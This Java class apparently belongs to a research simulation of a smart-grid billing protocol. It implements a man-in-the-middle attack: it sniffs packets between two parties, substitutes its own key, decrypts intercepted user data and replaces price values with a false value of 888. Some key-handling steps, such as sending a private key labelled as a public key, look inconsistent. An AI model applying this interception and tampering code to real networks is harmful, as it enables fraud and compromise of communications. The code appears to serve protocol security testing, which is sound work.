package SmartGridBillingSenario.attack;

import SmartGridBillingSenario.message.Message;
import SmartGridBillingSenario.message.MessageType;
import SmartGridBillingSenario.message.QuoteAndRateResponseMessage;
import SmartGridBillingSenario.socket.SocketClient;
import SmartGridBillingSenario.utils.Utils;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.codec.binary.Base64;
import org.pcap4j.packet.Packet;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.NoSuchAlgorithmException;
import java.util.Map;

import static SmartGridBillingSenario.utils.Utils.buildKeyPair;
import static SmartGridBillingSenario.utils.Utils.getTcpValue;

/**
 * Created by yuandai on 28/9/17.
 */
@Slf4j
public class ManInTheMiddle extends Pcap4j {


    private String host;
    private int trePort;
    private int ppPort;
    private int thisPort;

    private MiddleManClient middleManClientToPp;
    private MiddleManClient middleManClientToTre;

    private String publicKeyFromTre;

    private KeyPair keyPair;

    private static final int wrongValueToPp = 888;

    public ManInTheMiddle(String host, int serverPort) {
        super(host);
        this.host = host;
        this.trePort = serverPort;
        thisPort = 0;
        //create own KeyPair...
        keyPair = buildKeyPair();
    }

    private class MiddleManClient extends SocketClient {

        public MiddleManClient(String host, int port) {
            super(host, port);
            thisPort = clientPort;
        }
    }

    @Override
    public void handleTcpData(String srcAddr, String dstAddr, String srcPort, String dstPort, Packet payload) {
        // from TRE to PP
        if (Integer.valueOf(srcPort) == trePort && Integer.valueOf(dstPort) != thisPort) {
            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired for PP, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);

                    //get Public Key from TRE, replace with own public key
                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST)) {
                        publicKeyFromTre = String.valueOf(message.getObject());
                        log.info("HAHA!! Get PublicKey from TRE {}, replace with Own public Key", publicKeyFromTre);
                        ppPort = Integer.valueOf(dstPort);
                        sendOwnPublicKeyToPp();
                    }

                    // Get response from TRE, replace it with wrong value and send to PP
                    else if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_GET_PRICE)) {
                        Map<String, Object> result = (Map<String, Object>) message.getObject();
                        QuoteAndRateResponseMessage quoteAndRateResponseMessage = new QuoteAndRateResponseMessage(String.valueOf(result.get("quote")), Integer.valueOf(String.valueOf(result.get("rateValue"))));
                        String receivedQuote = quoteAndRateResponseMessage.getQuote();

                        log.info("HAHA!! Get received Quote and value from TRE {}, replace with wrong value 888, make you in trouble!!!");
                        ppPort = Integer.valueOf(dstPort);
                        sendWrongValueToPp(receivedQuote);
                    }
                } catch (Exception e) {
                    return;
                }
            }
            //from PP to TRE
        } else if (Integer.valueOf(dstPort) == trePort && Integer.valueOf(srcPort) != thisPort) {
            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired for TRE, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);
                    //get encrypte value from PP use it own private key to resolve it
                    if (message.getMessageType().equals(MessageType.GET_PRICE)) {
                        String user = decryptKey(String.valueOf(message.getObject()));
                        log.info("HAHA!! Get USER from PP {}, can send this user to TRE to get response", user);
                        ppPort = Integer.valueOf(srcPort);
                        sendEncryptedUserToTre(user);
                    } else if (message.getMessageType().equals(MessageType.ATTESTATION_REQUEST)){
                        ppPort = Integer.valueOf(srcPort);
                        publicKeyFromTre = String.valueOf(message.getObject());
                        sendOwnPublicKeyToPp();
                    }
                } catch (Exception e) {
                    return;
                }
            }
        }


    }

    private String decryptKey(String value) throws BadPaddingException, UnsupportedEncodingException, IllegalBlockSizeException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        return Utils.decrypt(value, keyPair.getPublic().getEncoded());
    }

    private void sendWrongValueToPp(String receivedQuote) {
        if (middleManClientToPp == null) {
            middleManClientToPp = new MiddleManClient(host, ppPort);
        }

        Message message = new Message(MessageType.RESPONSE_FROM_TRE_GET_PRICE, new QuoteAndRateResponseMessage(receivedQuote, wrongValueToPp));
        try {
            log.info("Send own value to PP {}", message);
            middleManClientToPp.sendToPort(Utils.messageToString(message));
        } catch (Exception e) {
            log.error("Cannot send Message!! {}", e);
        }
    }

    private void sendOwnPublicKeyToPp() {
        if (middleManClientToPp == null) {
            middleManClientToPp = new MiddleManClient(host, ppPort);
        }


        String publicKey = Base64.encodeBase64String(keyPair.getPrivate().getEncoded());
        Message message = new Message(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST, publicKey);
        try {
            log.info("Send own public key to PP {}", message);
            Message encryptedUser = middleManClientToPp.sendToPort(Utils.messageToString(message));

            String user = decryptKey(String.valueOf(encryptedUser.getObject()));
            sendEncryptedUserToTre(user);
        } catch (Exception e) {
            log.error("Cannot send Message!! {}", e);
        }
    }


    private void sendEncryptedUserToTre(String user) {

        if (middleManClientToTre == null) {
            middleManClientToTre = new MiddleManClient(host, trePort);
        }

        String encryptedValue = Utils.encrypt(user, Base64.decodeBase64(publicKeyFromTre));
        Message message = new Message(MessageType.GET_PRICE, encryptedValue);
        try {
            Message response = middleManClientToTre.sendToPort(Utils.messageToString(message));
            Map<String, Object> result = (Map<String, Object>) response.getObject();
            QuoteAndRateResponseMessage quoteAndRateResponseMessage = new QuoteAndRateResponseMessage(String.valueOf(result.get("quote")), Integer.valueOf(String.valueOf(result.get("rateValue"))));
            String receivedQuote = quoteAndRateResponseMessage.getQuote();

            log.info("HAHA!! Get received Quote and value from TRE {}, replace with wrong value 888, make you in trouble!!!");;
            sendWrongValueToPp(receivedQuote);
        } catch (Exception e) {

            log.error("Cannot send Message!! {}", e);
        }
    }

}

